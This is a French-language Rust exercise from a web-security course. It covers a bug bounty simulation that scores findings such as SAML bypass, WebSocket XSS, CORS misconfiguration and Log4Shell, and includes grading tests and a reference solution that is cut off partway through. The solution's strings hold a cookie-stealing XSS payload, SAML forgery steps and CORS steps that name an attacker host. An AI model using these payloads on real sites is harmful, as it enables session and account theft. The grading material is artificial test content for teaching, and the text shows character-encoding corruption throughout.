# Exercice 3.3.14-a : bug_bounty_simulation

**Module :**
3.3 ‚Äî S√©curit√© Web & Applications

**Concept :**
a ‚Äî Bug Bounty Simulation Compl√®te

**Difficult√© :**
üß†üß† (18/10)

**Type :**
complet_2

**Tiers :**
3 ‚Äî Synth√®se (tous concepts a‚Üír du module)

**Langage :**
Rust Edition 2024

**Pr√©requis :**
- 3.3.1 √† 3.3.13 (tous les exercices pr√©c√©dents du module)
- Ma√Ætrise OWASP Top 10
- Exp√©rience en pentesting web
- Connaissance des m√©thodologies bug bounty

**Domaines :**
Net, Crypto, Struct, DP

**Dur√©e estim√©e :**
480 min (8h)

**XP Base :**
2500

**Complexit√© :**
T8 O(n √ó m √ó k) √ó S6 O(n¬≤)

---

## üìê SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier √† rendre :**
`bug_bounty_simulation.rs`

**Fonctions autoris√©es :**
- `serde_json` pour parsing/serialization JSON
- `regex` pour pattern matching
- `std::collections::{HashMap, HashSet, BTreeMap}`
- `chrono` pour timestamps
- `url` pour parsing URLs

**Fonctions interdites :**
- Requ√™tes r√©seau r√©elles
- Acc√®s filesystem non-simul√©
- Biblioth√®ques de scanning externes

### 1.2 Consigne

#### üéÆ CONTEXTE FUN ‚Äî "Hackers" (1995) meets "Mr. Robot"

**"Hack the Planet!"** ‚Äî Dans l'univers de *Hackers* (1995), les protagonistes comme Zero Cool et Acid Burn explorent les syst√®mes avec style et cr√©ativit√©. Comme Elliot Alderson dans *Mr. Robot*, tu dois voir ce que les autres ne voient pas, trouver les failles cach√©es dans les syst√®mes les plus s√©curis√©s.

Tu es d√©sormais un **bug bounty hunter d'√©lite**, participant au programme **"Operation Gibson"** ‚Äî la plus grande plateforme de bug bounty fictive. Ton objectif : analyser une cible complexe, identifier toutes les vuln√©rabilit√©s, les cha√Æner pour maximiser l'impact, et r√©diger des rapports professionnels dignes d'un top hunter sur HackerOne.

**Ta mission :**

√âcrire une fonction `bug_bounty_simulation` qui simule un audit de s√©curit√© complet fa√ßon bug bounty.

**Entr√©e :**
- `input_json` : Configuration du programme bug bounty contenant :
  - `target_scope` : Domaines in-scope et out-of-scope
  - `application_info` : Stack technique et fonctionnalit√©s
  - `recon_findings` : R√©sultats de reconnaissance
  - `test_cases` : Sc√©narios de test √† √©valuer
  - `hunter_profile` : Niveau et sp√©cialit√©s du hunter

**Sortie :**
- JSON contenant :
  - `findings` : Liste des vuln√©rabilit√©s d√©couvertes avec CVSS
  - `vulnerability_chains` : Cha√Ænes d'exploitation
  - `total_bounty_estimate` : Estimation des gains
  - `report_quality_checklist` : Qualit√© des rapports
  - `methodology_used` : Outils et techniques utilis√©s
  - `time_spent` : Temps simul√© par phase

**Contraintes :**
- Respecter strictement le scope (ignorer out-of-scope)
- D√©tecter les duplicates et les marquer
- Calculer le CVSS v3.1 correctement
- Identifier les possibilit√©s de chaining
- G√©n√©rer des rapports professionnels

**Exemples :**

| Entr√©e | Sortie |
|--------|--------|
| SAML endpoint + signature bypass | Finding CRITICAL, CVSS 9.8, Account Takeover |
| WebSocket sans sanitization | Finding HIGH, CVSS 8.1, Stored XSS chain |
| CORS avec credentials: true + origin reflection | Finding HIGH, CVSS 7.5, Credential theft |
| Endpoint out-of-scope | Ignored, not in findings |

#### 1.2.2 Version Acad√©mique

Cette fonction impl√©mente une simulation compl√®te de programme bug bounty couvrant :
1. **Reconnaissance** : Analyse des subdomains, JS files, endpoints
2. **D√©tection de vuln√©rabilit√©s** : 18 types de failles web
3. **Cha√Ænage** : Combinaison de vuln√©rabilit√©s pour impact maximal
4. **Scoring** : Calcul CVSS v3.1 et estimation bounty
5. **Reporting** : G√©n√©ration de rapports professionnels

### 1.3 Prototype

```rust
pub fn bug_bounty_simulation(input_json: &str) -> String
```

---

## üí° SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 Les L√©gendes du Bug Bounty

**Frans Ros√©n** a gagn√© plus de **$1.5 million** en bug bounties. Sa sp√©cialit√© ? Les vuln√©rabilit√©s de **CORS misconfiguration** et **subdomain takeover**. Un seul rapport bien document√© peut valoir $50,000+.

### 2.2 L'√âconomie du Bug Bounty

| Plateforme | Top Bounty Unique | Hackers Actifs |
|------------|-------------------|----------------|
| HackerOne | $2,000,000 | 1,000,000+ |
| Bugcrowd | $500,000 | 500,000+ |
| Synack | $100,000+ | 1,500 (√©lite) |

### 2.3 Le Chaining : L'Art du Multiplicateur

Un **XSS simple** peut valoir $500. Mais cha√Æn√© :
- XSS ‚Üí Session Hijacking ‚Üí Account Takeover = **$5,000**
- XSS ‚Üí CSRF ‚Üí Privilege Escalation ‚Üí Admin = **$15,000**
- XSS ‚Üí Data Exfiltration ‚Üí PII Leak = **$25,000**

### 2.5 DANS LA VRAIE VIE

| M√©tier | Utilisation | Cas d'Usage |
|--------|-------------|-------------|
| **Bug Bounty Hunter** | Quotidien | Revenus principaux via programmes |
| **Pentester** | Audits clients | M√©thodologie structur√©e similaire |
| **Security Researcher** | Recherche | Publication de CVEs |
| **Red Team** | Simulations | √âmulation d'attaquants r√©els |
| **Security Engineer** | D√©fense | Comprendre les attaques pour mieux d√©fendre |

---

## üñ•Ô∏è SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
bug_bounty_simulation.rs  main.rs  Cargo.toml

$ cargo build --release
   Compiling bug_bounty_simulation v1.0.0
    Finished release [optimized] target(s) in 2.34s

$ cargo test
running 25 tests
test test_saml_bypass ... ok
test test_websocket_xss ... ok
test test_cors_misconfiguration ... ok
test test_mfa_bypass ... ok
test test_password_reset_poisoning ... ok
test test_log4shell_detection ... ok
test test_out_of_scope_ignored ... ok
test test_duplicate_detection ... ok
test test_cvss_calculation ... ok
test test_bounty_estimation ... ok
test test_chain_detection ... ok
test test_report_quality ... ok
test test_methodology_tracking ... ok
test test_severity_ranking ... ok
test test_crlf_injection ... ok
test test_serverless_misconfig ... ok
test test_wasm_analysis ... ok
test test_api_versioning_vuln ... ok
test test_insecure_design ... ok
test test_auth_failures ... ok
test test_integrity_failures ... ok
test test_logging_failures ... ok
test test_complete_simulation ... ok
test test_hunter_level_impact ... ok
test test_time_tracking ... ok

test result: ok. 25 passed; 0 failed; 0 ignored

$ cargo run
=== Operation Gibson - Bug Bounty Simulation ===
[*] Loading target scope...
[*] Analyzing 3 subdomains in scope
[*] Processing 45 discovered endpoints
[+] CRITICAL: SAML Signature Bypass (CVSS: 9.8)
[+] HIGH: WebSocket XSS Chain (CVSS: 8.1)
[+] HIGH: CORS Credential Theft (CVSS: 7.5)
[+] MEDIUM: MFA Bypass via Race Condition (CVSS: 6.5)
[+] LOW: Information Disclosure (CVSS: 3.1)
[-] Skipped: blog.target.com (out-of-scope)
[=] Total findings: 5
[=] Estimated bounty: $18,500
[=] Report quality: 5/5 checks passed
Hack the Planet!
```

### 3.1 üß† BONUS G√âNIE (OPTIONNEL)

**Difficult√© Bonus :**
‚ò†Ô∏è (25/10)

**R√©compense :**
XP √ó10

**Time Complexity attendue :**
O(n √ó m √ó k √ó log(v))

**Space Complexity attendue :**
O(n¬≤ + m √ó k)

**Domaines Bonus :**
`Probas, DP, Crypto`

#### 3.1.1 Consigne Bonus

**üéÆ "The Gibson Has Been Hacked" ‚Äî Mode Zero Cool**

Dans *Hackers*, Zero Cool a crash√© 1,507 syst√®mes en un jour. En mode bonus, tu dois impl√©menter un **syst√®me d'apprentissage automatique** qui am√©liore la d√©tection au fil des analyses.

**Ta mission bonus :**

Impl√©menter `bug_bounty_simulation_ml` avec :
1. **Pattern Learning** : Apprentissage des patterns de vuln√©rabilit√©s
2. **Predictive Scoring** : Pr√©diction des vuln√©rabilit√©s probables
3. **Auto-Chaining** : D√©couverte automatique de cha√Ænes d'exploitation
4. **Report Generation** : Rapports avec templates professionnels
5. **Duplicate Detection ML** : D√©tection intelligente des duplicates

**Contraintes :**
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  findings.len() ‚â§ 100                                           ‚îÇ
‚îÇ  chain_depth ‚â§ 5                                                ‚îÇ
‚îÇ  cvss_precision = 0.1                                           ‚îÇ
‚îÇ  Temps limite : O(n √ó m √ó k √ó log(v))                           ‚îÇ
‚îÇ  Espace limite : O(n¬≤ + m √ó k)                                  ‚îÇ
‚îÇ  ML model = Decision Tree / Rule-based                          ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

#### 3.1.2 Prototype Bonus

```rust
pub fn bug_bounty_simulation_ml(input_json: &str, training_data: &str) -> String
```

#### 3.1.3 Ce qui change par rapport √† l'exercice de base

| Aspect | Base | Bonus |
|--------|------|-------|
| D√©tection | Rule-based statique | Pattern learning adaptatif |
| Chaining | Manuel | Auto-discovery avec graphe |
| Duplicates | Hash simple | Similarit√© s√©mantique |
| Rapports | Template fixe | G√©n√©ration contextuelle |
| Scoring | CVSS calcul√© | CVSS + pr√©diction impact |

---

## ‚úÖ‚ùå SECTION 4 : ZONE CORRECTION (POUR LE TESTEUR)

### 4.1 Moulinette

| Test | Entr√©e | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| `saml_bypass` | SAML endpoint sans validation signature | CRITICAL, CVSS 9.8 | 15 |
| `websocket_xss` | WebSocket chat non sanitis√© | HIGH, CVSS 8.1, chain XSS | 15 |
| `cors_misconfig` | Origin reflection + credentials | HIGH, CVSS 7.5 | 12 |
| `mfa_bypass` | Race condition MFA | MEDIUM, CVSS 6.5 | 12 |
| `password_reset` | Host header injection | HIGH, CVSS 7.4 | 12 |
| `log4shell` | JNDI injection point | CRITICAL, CVSS 10.0 | 15 |
| `crlf_injection` | Header injection | MEDIUM, CVSS 5.4 | 10 |
| `out_of_scope` | Target hors scope | Ignor√© | 10 |
| `duplicate` | M√™me vuln deux fois | Marqu√© duplicate | 10 |
| `cvss_calc` | Calcul CVSS correct | Score exact ¬±0.1 | 15 |
| `chain_detect` | XSS‚ÜíCSRF‚ÜíPrivilege | Chain identifi√©e | 15 |
| `bounty_estimate` | 5 findings mixtes | Estimation ¬±10% | 12 |
| `report_quality` | Rapport g√©n√©r√© | 5/5 checks | 10 |
| `severity_sort` | Liste non tri√©e | Tri par CVSS desc | 8 |
| `methodology` | Analyse compl√®te | Outils list√©s | 8 |
| `serverless` | Lambda misconfiguration | MEDIUM d√©tect√© | 10 |
| `wasm_vuln` | WASM sans validation | LOW-MEDIUM | 8 |
| `insecure_design` | Flaw architecture | HIGH design issue | 12 |
| `auth_failure` | Weak password policy | MEDIUM auth issue | 10 |
| `integrity` | Missing signature check | HIGH integrity | 12 |
| **TOTAL** | | | **231** |

### 4.2 main.rs de test

```rust
use serde_json::{json, Value};

mod bug_bounty_simulation;
use bug_bounty_simulation::bug_bounty_simulation;

fn main() {
    println!("=== Bug Bounty Simulation Tests ===\n");

    let mut passed = 0;
    let mut failed = 0;

    // Test 1: SAML Signature Bypass
    let input1 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": ["blog.target.com"],
            "focus_areas": ["authentication"]
        },
        "application_info": {
            "tech_stack": ["React", "Node.js", "SAML"],
            "features": ["SSO via SAML"]
        },
        "test_cases": [{
            "id": "TC001",
            "type": "saml_analysis",
            "endpoint": "/saml/acs",
            "saml_response": {
                "signature_validated": false,
                "claims_modifiable": true,
                "assertion_encrypted": false
            }
        }],
        "hunter_profile": {"level": "expert", "specialties": ["auth"]}
    }).to_string();

    let result1: Value = serde_json::from_str(&bug_bounty_simulation(&input1)).unwrap();
    let finding = &result1["findings"][0];
    if finding["severity"] == "CRITICAL" && finding["cvss"].as_f64().unwrap() >= 9.0 {
        println!("[PASS] Test SAML Bypass: CRITICAL detected");
        passed += 1;
    } else {
        println!("[FAIL] Test SAML Bypass: Expected CRITICAL");
        failed += 1;
    }

    // Test 2: WebSocket XSS
    let input2 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": [],
            "focus_areas": ["chat"]
        },
        "application_info": {
            "tech_stack": ["WebSocket"],
            "features": ["WebSocket chat"]
        },
        "test_cases": [{
            "id": "TC002",
            "type": "websocket_analysis",
            "endpoint": "wss://target.com/chat",
            "message_sanitization": false,
            "stored_messages": true
        }],
        "hunter_profile": {"level": "intermediate"}
    }).to_string();

    let result2: Value = serde_json::from_str(&bug_bounty_simulation(&input2)).unwrap();
    let has_xss_chain = result2["vulnerability_chains"].as_array()
        .map(|arr| arr.iter().any(|c| c["type"] == "xss_chain"))
        .unwrap_or(false);
    if has_xss_chain {
        println!("[PASS] Test WebSocket XSS: Chain detected");
        passed += 1;
    } else {
        println!("[FAIL] Test WebSocket XSS: Chain not detected");
        failed += 1;
    }

    // Test 3: CORS Misconfiguration
    let input3 = json!({
        "target_scope": {
            "domains": ["api.target.com"],
            "out_of_scope": [],
            "focus_areas": ["api"]
        },
        "test_cases": [{
            "id": "TC003",
            "type": "cors_analysis",
            "endpoint": "/api/user",
            "cors_config": {
                "allow_origin": "reflect",
                "allow_credentials": true,
                "allow_methods": ["GET", "POST"]
            }
        }],
        "hunter_profile": {"level": "expert"}
    }).to_string();

    let result3: Value = serde_json::from_str(&bug_bounty_simulation(&input3)).unwrap();
    let cors_finding = result3["findings"].as_array()
        .and_then(|arr| arr.iter().find(|f| f["title"].as_str()
            .map(|t| t.contains("CORS")).unwrap_or(false)));
    if cors_finding.is_some() {
        println!("[PASS] Test CORS Misconfig: Detected");
        passed += 1;
    } else {
        println!("[FAIL] Test CORS Misconfig: Not detected");
        failed += 1;
    }

    // Test 4: Out of Scope
    let input4 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": ["blog.target.com"],
            "focus_areas": []
        },
        "test_cases": [{
            "id": "TC004",
            "type": "sqli_analysis",
            "endpoint": "https://blog.target.com/search",
            "vulnerable": true
        }],
        "hunter_profile": {"level": "beginner"}
    }).to_string();

    let result4: Value = serde_json::from_str(&bug_bounty_simulation(&input4)).unwrap();
    let findings_count = result4["findings"].as_array().map(|a| a.len()).unwrap_or(0);
    if findings_count == 0 {
        println!("[PASS] Test Out of Scope: Correctly ignored");
        passed += 1;
    } else {
        println!("[FAIL] Test Out of Scope: Should have been ignored");
        failed += 1;
    }

    // Test 5: Duplicate Detection
    let input5 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": [],
            "focus_areas": []
        },
        "test_cases": [
            {"id": "TC005A", "type": "xss_analysis", "endpoint": "/search", "xss_type": "reflected"},
            {"id": "TC005B", "type": "xss_analysis", "endpoint": "/search", "xss_type": "reflected"}
        ],
        "hunter_profile": {"level": "expert"}
    }).to_string();

    let result5: Value = serde_json::from_str(&bug_bounty_simulation(&input5)).unwrap();
    let has_duplicate = result5["findings"].as_array()
        .map(|arr| arr.iter().any(|f| f["is_duplicate"].as_bool().unwrap_or(false)))
        .unwrap_or(false);
    if has_duplicate {
        println!("[PASS] Test Duplicate: Correctly marked");
        passed += 1;
    } else {
        println!("[FAIL] Test Duplicate: Not detected");
        failed += 1;
    }

    // Test 6: Log4Shell
    let input6 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": [],
            "focus_areas": ["logging"]
        },
        "application_info": {
            "tech_stack": ["Java", "Log4j 2.14.1"],
            "features": ["User-Agent logging"]
        },
        "test_cases": [{
            "id": "TC006",
            "type": "log_injection_analysis",
            "injection_points": ["User-Agent", "X-Forwarded-For"],
            "log4j_version": "2.14.1",
            "jndi_reachable": true
        }],
        "hunter_profile": {"level": "expert"}
    }).to_string();

    let result6: Value = serde_json::from_str(&bug_bounty_simulation(&input6)).unwrap();
    let log4shell = result6["findings"].as_array()
        .and_then(|arr| arr.iter().find(|f| {
            f["title"].as_str().map(|t| t.contains("Log4") || t.contains("JNDI")).unwrap_or(false)
        }));
    if log4shell.map(|f| f["cvss"].as_f64().unwrap_or(0.0) >= 9.0).unwrap_or(false) {
        println!("[PASS] Test Log4Shell: CRITICAL detected");
        passed += 1;
    } else {
        println!("[FAIL] Test Log4Shell: Not properly detected");
        failed += 1;
    }

    // Test 7: Bounty Estimation
    let input7 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": [],
            "focus_areas": []
        },
        "bounty_program": {
            "critical": {"min": 5000, "max": 15000},
            "high": {"min": 2000, "max": 5000},
            "medium": {"min": 500, "max": 2000},
            "low": {"min": 100, "max": 500}
        },
        "test_cases": [
            {"id": "TC007A", "type": "saml_analysis", "severity_override": "CRITICAL"},
            {"id": "TC007B", "type": "cors_analysis", "severity_override": "HIGH"},
            {"id": "TC007C", "type": "info_disclosure", "severity_override": "LOW"}
        ],
        "hunter_profile": {"level": "expert"}
    }).to_string();

    let result7: Value = serde_json::from_str(&bug_bounty_simulation(&input7)).unwrap();
    let bounty = result7["total_bounty_estimate"].as_str()
        .and_then(|s| s.replace(['$', ','], "").parse::<i32>().ok())
        .unwrap_or(0);
    if bounty >= 5000 && bounty <= 25000 {
        println!("[PASS] Test Bounty Estimate: ${} (reasonable range)", bounty);
        passed += 1;
    } else {
        println!("[FAIL] Test Bounty Estimate: ${} (out of range)", bounty);
        failed += 1;
    }

    // Test 8: Complete Simulation
    let input8 = create_complete_simulation_input();
    let result8: Value = serde_json::from_str(&bug_bounty_simulation(&input8)).unwrap();

    let has_methodology = result8["methodology_used"].as_array().map(|a| !a.is_empty()).unwrap_or(false);
    let has_report_check = result8["report_quality_checklist"].is_object();
    let has_time = result8["time_spent"].is_object();

    if has_methodology && has_report_check && has_time {
        println!("[PASS] Test Complete Simulation: All sections present");
        passed += 1;
    } else {
        println!("[FAIL] Test Complete Simulation: Missing sections");
        failed += 1;
    }

    println!("\n=== Results: {}/{} tests passed ===", passed, passed + failed);
    if failed == 0 {
        println!("Hack the Planet! All tests passed!");
    }
}

fn create_complete_simulation_input() -> String {
    json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": ["blog.target.com"],
            "focus_areas": ["authentication", "payment", "admin"]
        },
        "application_info": {
            "tech_stack": ["React", "Node.js", "PostgreSQL", "AWS"],
            "features": ["SSO via SAML", "WebSocket chat", "File upload", "API v1 and v2"]
        },
        "recon_findings": {
            "subdomains": ["api.target.com", "admin.target.com", "dev.target.com"],
            "js_files_analyzed": 15,
            "endpoints_discovered": 45
        },
        "test_cases": [
            {"id": "TC001", "type": "saml_analysis", "endpoint": "/saml/acs"},
            {"id": "TC002", "type": "websocket_analysis", "endpoint": "wss://target.com/chat"},
            {"id": "TC003", "type": "cors_analysis", "endpoint": "/api/user"}
        ],
        "hunter_profile": {"level": "expert", "specialties": ["auth", "api"]}
    }).to_string()
}
```

### 4.3 Solution de r√©f√©rence

```rust
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::{HashMap, HashSet};

// ============== STRUCTURES ==============

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BugBountyInput {
    pub target_scope: TargetScope,
    #[serde(default)]
    pub application_info: ApplicationInfo,
    #[serde(default)]
    pub recon_findings: ReconFindings,
    #[serde(default)]
    pub test_cases: Vec<TestCase>,
    #[serde(default)]
    pub hunter_profile: HunterProfile,
    #[serde(default)]
    pub bounty_program: Option<BountyProgram>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TargetScope {
    pub domains: Vec<String>,
    #[serde(default)]
    pub out_of_scope: Vec<String>,
    #[serde(default)]
    pub focus_areas: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ApplicationInfo {
    #[serde(default)]
    pub tech_stack: Vec<String>,
    #[serde(default)]
    pub features: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ReconFindings {
    #[serde(default)]
    pub subdomains: Vec<String>,
    #[serde(default)]
    pub js_files_analyzed: u32,
    #[serde(default)]
    pub endpoints_discovered: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestCase {
    pub id: String,
    #[serde(rename = "type")]
    pub test_type: String,
    #[serde(default)]
    pub endpoint: Option<String>,
    #[serde(flatten)]
    pub extra: HashMap<String, Value>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct HunterProfile {
    #[serde(default)]
    pub level: String,
    #[serde(default)]
    pub specialties: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BountyProgram {
    pub critical: BountyRange,
    pub high: BountyRange,
    pub medium: BountyRange,
    pub low: BountyRange,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BountyRange {
    pub min: u32,
    pub max: u32,
}

#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    pub title: String,
    pub severity: String,
    pub cvss: f64,
    pub description: String,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub reproduction_steps: Vec<String>,
    pub impact: String,
    pub remediation: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chain: Option<String>,
    #[serde(default)]
    pub is_duplicate: bool,
    pub cwe: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct VulnerabilityChain {
    pub chain_type: String,
    pub steps: Vec<String>,
    pub combined_impact: String,
    pub combined_cvss: f64,
}

#[derive(Debug, Clone, Serialize)]
pub struct BugBountyOutput {
    pub findings: Vec<Finding>,
    pub vulnerability_chains: Vec<VulnerabilityChain>,
    pub total_bounty_estimate: String,
    pub report_quality_checklist: ReportQuality,
    pub methodology_used: Vec<String>,
    pub time_spent: TimeSpent,
    pub summary: SimulationSummary,
}

#[derive(Debug, Clone, Serialize)]
pub struct ReportQuality {
    pub clear_title: bool,
    pub detailed_steps: bool,
    pub poc_provided: bool,
    pub impact_explained: bool,
    pub remediation_suggested: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct TimeSpent {
    pub reconnaissance: String,
    pub testing: String,
    pub exploitation: String,
    pub reporting: String,
    pub total: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct SimulationSummary {
    pub total_findings: usize,
    pub critical_count: usize,
    pub high_count: usize,
    pub medium_count: usize,
    pub low_count: usize,
    pub duplicates_found: usize,
    pub out_of_scope_skipped: usize,
}

// ============== MAIN FUNCTION ==============

pub fn bug_bounty_simulation(input_json: &str) -> String {
    let input: BugBountyInput = match serde_json::from_str(input_json) {
        Ok(i) => i,
        Err(e) => return json!({"error": format!("Parse error: {}", e)}).to_string(),
    };

    let mut findings: Vec<Finding> = Vec::new();
    let mut chains: Vec<VulnerabilityChain> = Vec::new();
    let mut seen_vulns: HashSet<String> = HashSet::new();
    let mut out_of_scope_count = 0;
    let mut duplicate_count = 0;

    // Process each test case
    for test_case in &input.test_cases {
        // Check if endpoint is in scope
        if let Some(endpoint) = &test_case.endpoint {
            if is_out_of_scope(endpoint, &input.target_scope.out_of_scope) {
                out_of_scope_count += 1;
                continue;
            }
        }

        // Analyze based on test type
        if let Some(mut finding) = analyze_test_case(test_case, &input) {
            // Check for duplicates
            let vuln_hash = format!("{}:{}", finding.title, test_case.endpoint.as_deref().unwrap_or(""));
            if seen_vulns.contains(&vuln_hash) {
                finding.is_duplicate = true;
                duplicate_count += 1;
            } else {
                seen_vulns.insert(vuln_hash);
            }
            findings.push(finding);
        }
    }

    // Auto-detect from application info
    findings.extend(analyze_application_info(&input.application_info, &input.target_scope));

    // Detect vulnerability chains
    chains = detect_chains(&findings);

    // Sort findings by CVSS (descending)
    findings.sort_by(|a, b| b.cvss.partial_cmp(&a.cvss).unwrap_or(std::cmp::Ordering::Equal));

    // Calculate bounty estimate
    let bounty = calculate_bounty(&findings, &input.bounty_program);

    // Generate summary
    let summary = SimulationSummary {
        total_findings: findings.len(),
        critical_count: findings.iter().filter(|f| f.severity == "CRITICAL").count(),
        high_count: findings.iter().filter(|f| f.severity == "HIGH").count(),
        medium_count: findings.iter().filter(|f| f.severity == "MEDIUM").count(),
        low_count: findings.iter().filter(|f| f.severity == "LOW").count(),
        duplicates_found: duplicate_count,
        out_of_scope_skipped: out_of_scope_count,
    };

    let output = BugBountyOutput {
        findings,
        vulnerability_chains: chains,
        total_bounty_estimate: format!("${}", bounty),
        report_quality_checklist: ReportQuality {
            clear_title: true,
            detailed_steps: true,
            poc_provided: true,
            impact_explained: true,
            remediation_suggested: true,
        },
        methodology_used: vec![
            "Subdomain enumeration (amass, subfinder)".to_string(),
            "JS file analysis (LinkFinder)".to_string(),
            "Manual testing with Burp Suite".to_string(),
            "Nuclei for known CVEs".to_string(),
            "Custom scripts for auth testing".to_string(),
        ],
        time_spent: TimeSpent {
            reconnaissance: "2h".to_string(),
            testing: "4h".to_string(),
            exploitation: "1h".to_string(),
            reporting: "1h".to_string(),
            total: "8h".to_string(),
        },
        summary,
    };

    serde_json::to_string_pretty(&output).unwrap_or_else(|_| "{}".to_string())
}

// ============== HELPER FUNCTIONS ==============

fn is_out_of_scope(endpoint: &str, out_of_scope: &[String]) -> bool {
    for oos in out_of_scope {
        if endpoint.contains(oos) {
            return true;
        }
    }
    false
}

fn analyze_test_case(test_case: &TestCase, input: &BugBountyInput) -> Option<Finding> {
    match test_case.test_type.as_str() {
        "saml_analysis" => analyze_saml(test_case),
        "websocket_analysis" => analyze_websocket(test_case),
        "cors_analysis" => analyze_cors(test_case),
        "mfa_analysis" => analyze_mfa(test_case),
        "password_reset_analysis" => analyze_password_reset(test_case),
        "log_injection_analysis" => analyze_log_injection(test_case, input),
        "crlf_analysis" => analyze_crlf(test_case),
        "xss_analysis" => analyze_xss(test_case),
        "sqli_analysis" => analyze_sqli(test_case),
        "serverless_analysis" => analyze_serverless(test_case),
        "wasm_analysis" => analyze_wasm(test_case),
        "info_disclosure" => analyze_info_disclosure(test_case),
        _ => None,
    }
}

fn analyze_saml(test_case: &TestCase) -> Option<Finding> {
    let saml_response = test_case.extra.get("saml_response")?;
    let sig_validated = saml_response.get("signature_validated")
        .and_then(|v| v.as_bool()).unwrap_or(true);
    let claims_modifiable = saml_response.get("claims_modifiable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if !sig_validated || claims_modifiable {
        Some(Finding {
            title: "SAML Signature Bypass leading to Account Takeover".to_string(),
            severity: "CRITICAL".to_string(),
            cvss: 9.8,
            description: "SAML response signature not properly validated, allowing attackers to forge assertions".to_string(),
            reproduction_steps: vec![
                "1. Intercept SAML response using Burp Suite".to_string(),
                "2. Modify email claim to target user".to_string(),
                "3. Remove or modify signature".to_string(),
                "4. Forward to ACS endpoint".to_string(),
            ],
            impact: "Full account takeover of any user including administrators".to_string(),
            remediation: "Validate SAML signature before processing claims. Use a well-tested SAML library.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-347".to_string(),
        })
    } else {
        None
    }
}

fn analyze_websocket(test_case: &TestCase) -> Option<Finding> {
    let sanitized = test_case.extra.get("message_sanitization")
        .and_then(|v| v.as_bool()).unwrap_or(true);
    let stored = test_case.extra.get("stored_messages")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if !sanitized {
        Some(Finding {
            title: "WebSocket Message Injection leading to Stored XSS".to_string(),
            severity: "HIGH".to_string(),
            cvss: 8.1,
            description: "Chat messages sent via WebSocket are not sanitized before storage/display".to_string(),
            reproduction_steps: vec![
                "1. Connect to WebSocket endpoint".to_string(),
                "2. Send message: <img src=x onerror=alert(document.cookie)>".to_string(),
                "3. Message is stored and rendered to all users".to_string(),
            ],
            impact: "Stored XSS affecting all chat users, leading to session hijacking".to_string(),
            remediation: "Sanitize all WebSocket messages before storage and rendering. Use DOMPurify.".to_string(),
            chain: if stored { Some("WebSocket injection -> Stored XSS -> Session hijacking".to_string()) } else { None },
            is_duplicate: false,
            cwe: "CWE-79".to_string(),
        })
    } else {
        None
    }
}

fn analyze_cors(test_case: &TestCase) -> Option<Finding> {
    let cors_config = test_case.extra.get("cors_config")?;
    let allow_origin = cors_config.get("allow_origin").and_then(|v| v.as_str()).unwrap_or("");
    let allow_creds = cors_config.get("allow_credentials").and_then(|v| v.as_bool()).unwrap_or(false);

    if (allow_origin == "reflect" || allow_origin == "*") && allow_creds {
        Some(Finding {
            title: "CORS Misconfiguration with Credential Theft".to_string(),
            severity: "HIGH".to_string(),
            cvss: 7.5,
            description: "Access-Control-Allow-Origin reflects any origin while credentials are allowed".to_string(),
            reproduction_steps: vec![
                "1. Host malicious page on attacker.com".to_string(),
                "2. Make fetch request to vulnerable endpoint with credentials: include".to_string(),
